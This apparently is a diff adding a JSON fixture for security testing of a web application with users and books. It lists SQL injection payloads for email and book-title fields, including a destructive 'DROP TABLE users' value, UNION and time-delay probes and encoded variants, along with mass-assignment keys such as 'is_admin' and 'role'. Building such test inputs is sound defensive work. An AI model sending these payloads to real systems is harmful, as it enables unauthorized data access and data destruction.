@@ -1,0 +1,20 @@
+{
+  "user_ids_to_probe": [1, 2, 3],
+  "injection_payloads": [
+    "test@example.com' OR '1'='1",
+    "test@example.com\" OR \"1\"=\"1",
+    "test@example.com; DROP TABLE users; --"
+  ],
+  "mass_assignment_keys": ["admin", "is_admin", "role", "verified", "permissions"],
+  "email_context_payloads": [
+    "attacker@example.com' UNION SELECT null--",
+    "attacker@example.com') OR ('1'='1",
+    "attacker@example.com'; WAITFOR DELAY '00:00:03'--",
+    "attacker@example.com'/**/OR/**/'1'='1"
+  ],
+  "book_context_payloads": [
+    "bookTitle1' OR '1'='1",
+    "bookTitle1%27%20OR%201%3D1--",
+    "bookTitle1' UNION SELECT sqlite_version()--"
+  ]
+}
